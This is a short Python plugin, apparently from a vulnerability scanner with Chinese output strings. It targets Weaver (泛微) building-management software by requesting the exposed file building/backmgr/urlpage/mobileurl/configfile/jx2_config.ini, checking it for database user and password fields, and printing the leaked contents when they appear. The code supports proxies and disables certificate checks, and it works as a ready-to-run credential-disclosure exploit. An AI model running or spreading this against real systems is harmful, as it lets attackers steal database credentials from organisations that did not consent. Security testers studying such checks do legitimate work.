import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
        aa1 = requests.get(url1+'building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini',proxies=proxies,headers=headers,verify=False,timeout=15,cookies=s_cookie)
        if "sdbbase" in aa1.text and "sdbuser" in aa1.text and "sdbpassword" in aa1.text and "reqdeliveryreport" in aa1.text and aa1.status_code == 200:
            cdd='[+]漏洞存在\n'+ str(aa1.text)[0:100]+'\n'+'地址：\nbuilding/backmgr/urlpage/mobileurl/configfile/jx2_config.ini'
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 数据库账号密码泄露 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)